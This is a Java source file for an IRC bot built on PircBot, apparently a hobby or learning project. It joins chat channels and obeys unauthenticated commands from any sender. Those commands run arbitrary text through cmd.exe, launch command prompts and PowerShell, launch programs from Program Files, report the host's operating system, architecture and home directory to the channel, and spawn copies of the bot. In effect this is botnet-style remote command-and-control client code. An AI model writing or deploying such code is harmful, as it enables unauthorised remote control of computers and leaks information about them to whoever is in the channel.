import org.jibble.pircbot.*;

import java.io.*;
import java.net.*;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.regex.*;
import java.util.Random;

public class TestBot extends PircBot{
    private int id;

    private Server server;
    private Socket socket;

    private BufferedReader serverIn;
    private PrintStream clientOut;

    private String currentLine = "";
    private String serverMessage;

    private Process serverJob;
    private Process terminal;

    private boolean isInitialized = false;

    public TestBot(){
        Random rand = new Random();
        this.id = rand.nextInt(100);
        byte[]bytes = new byte[7];
        rand.nextBytes(bytes);
        String name = new String(bytes, Charset.forName("UTF-8"));

        this.setName("B"+name.hashCode()+"T");
    }
    public boolean initiateClient(int port){
        try{
            socket = new Socket("localhost",port);
            serverIn = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            clientOut = new PrintStream(socket.getOutputStream());
        }catch(IOException e){
            e.printStackTrace();
            System.out.println("Error initiating client");
        }
        return false;
    }
    public Process terminalCommander(String command){
        try{
            String start = "cmd /c start cmd.exe";
            String cmd = " /K \""+command+"\"";

            Process process = Runtime.getRuntime().exec(start+cmd);
            return process;
        }catch(Exception e){
            e.printStackTrace();
        }
        return null;
    }
    public void startTerminal(){
        try{
            String cmd = "cmd /c start cmd.exe /K \"ping localhost\"";
            Process process = Runtime.getRuntime().exec(cmd);
            process.wait(100000);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public void startPowerShell(){
        try{
            String cmd = "powershell.exe ";
            Process process = Runtime.getRuntime().exec(cmd);
            process.wait(100000);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public void startExeW(String program){
        String pgFiles = System.getenv("programfiles");
        String seperator = System.getProperty("file.seperator");

        String[] commands = {"cmd.exe",
                             "/c",
                             pgFiles +
                             seperator +
                             program +
                             seperator +
                             program+".exe"
                            };
        try{
            Runtime.getRuntime().exec(commands);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public String tellServer(String message){
        try{
            initiateClient(15485);


            clientOut.println(this.id+": "+message);
            String response = serverIn.readLine();

            socket.close();
            serverIn.close();
            clientOut.close();
            return response;
        }catch(Exception e){
            e.printStackTrace();
        }
        return null;
    }
    public boolean spawnClone(){
        try{
            String command = "javac -classpath pircbot.jar;. *.java && java -classpath pircbot.jar; TestBotMain main";
            terminalCommander(command);
            return true;
        }catch(Exception e){
            e.printStackTrace();
        }
        return false;
    }
    public boolean initiateServer(){
        try{
            String id = Integer.toString(this.id);
            int port = 15485;
            String command = "java -classpath .;. Server "+id+" "+port;
            serverJob = terminalCommander(command);

            //serverIn = new BufferedReader(new InputStreamReader(serverJob.getInputStream()));
            //clientOut = new PrintStream(serverJob.getOutputStream());
            //serverIn = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            return serverJob.isAlive();
        }catch(Exception e){
            e.printStackTrace();
        }
        return false;
    }
    public void useCurrentTerminal(String commands){
        try{
            Process process = Runtime.getRuntime().exec(commands);

            BufferedReader input = new BufferedReader(new InputStreamReader(process.getInputStream()));

            StringBuffer cmd = new StringBuffer();
            StringBuffer ret = new StringBuffer();

            String temp;
            while((temp = input.readLine()) != null){
                ret.append(temp);
            }
            input.close();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public void parseCommand(String[]commands){
        try{
            StringBuffer cmd = new StringBuffer();

            for(int i=1;i<commands.length;i++){
                cmd.append(commands[i]+" ");
            }
            terminal = terminalCommander(cmd.toString());
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public String getServerDetails(){
        String details =
                            " \nsystem properties "+System.getProperty("os.name")+
                            " \nsystem user id "+System.getProperty("user.dir") +
                            " \nsystem operating system version "+System.getProperty("os.version") +
                            " \nsystem architecture "+System.getProperty("os.arch")+
                            " \nsystem home directory "+System.getProperty("user.home");
        return details;
    }

    public void onMessage(String channel,String sender,String login,String hostName,String message) {
        if (message.equalsIgnoreCase("#time")) {
            String time = new java.util.Date().toString();
            sendMessage(channel, sender+" the current Time is " + time);
        }

        if(message.equalsIgnoreCase("#start")){
            sendMessage(channel,"initiating server");
            if(initiateServer()){
                sendMessage(channel,"server init done");
            }else{
                sendMessage(channel,"Error starting bot services");
            }
        }

        if(message.equalsIgnoreCase("#is up")){
            sendMessage(channel,sender+" "+socket.isConnected());
        }
        if(message.equalsIgnoreCase("#terminal")){
            startTerminal();
        }
        if(message.equalsIgnoreCase("#powershell")){
            startPowerShell();
        }
        if(message.split(" ")[0].equalsIgnoreCase("#command")){
            String[] commands = message.split(" ");
            parseCommand(commands);
            sendMessage(channel,sender+" ~success");
        }
        if(message.equalsIgnoreCase("#clone")){
            sendMessage(channel,sender+" spawned clone "+spawnClone());
        }
        if(message.equalsIgnoreCase("#get details")){
            sendMessage(channel,sender+" "+getServerDetails());
        }
        if(message.split(" ")[0].equalsIgnoreCase("#begin")){
            String program = message.split(" ")[1];
            startExeW(program);
        }
        if(message.split(" ")[0].equalsIgnoreCase("#tell")){
            sendMessage(channel,sender+" "+tellServer(message));
        }
        if(message.equalsIgnoreCase("#close")){
            try{
                disconnect();
                serverIn.close();
                clientOut.close();
                System.exit(0);
            }catch(Exception e){
                e.printStackTrace();
            }
        }
        if(isInitialized){
            try{
                serverJob.waitFor();
            }catch(Exception e){
                e.printStackTrace();
            }
        }
    }
}